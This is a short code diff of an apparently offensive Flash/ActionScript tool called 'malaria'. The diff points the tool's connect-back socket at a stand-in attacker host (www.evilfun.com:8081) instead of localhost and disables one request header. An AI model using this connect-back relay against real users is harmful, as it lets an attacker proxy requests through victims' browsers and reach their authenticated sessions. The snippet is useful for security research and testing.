@@ -21,7 +21,7 @@ xmlns="*" creationComplete="useHttpService()">
 				ExternalInterface.call("log", "Connecting back to malaria server...");
 				socket.addEventListener(Event.CONNECT, this.connectHandler);
 				socket.addEventListener(ProgressEvent.SOCKET_DATA, this.onData);
-				socket.connect("localhost", 8081);
+				socket.connect("www.evilfun.com", 8081);
 		    }
 		    private function onData(event:ProgressEvent):void
 		    {
@@ -49,7 +49,7 @@ xmlns="*" creationComplete="useHttpService()">
 				if (reqData != null && reqData != "") {
 					urlRequest.data = new URLVariables(reqData);
 				}
-				urlRequest.requestHeaders.push(new URLRequestHeader("Accept", accept));
+				//urlRequest.requestHeaders.push(new URLRequestHeader("Accept", accept));
 				var loader:URLLoader = new URLLoader();
 				loader.dataFormat = URLLoaderDataFormat.BINARY;
 				loader.addEventListener(Event.COMPLETE, onComplete);
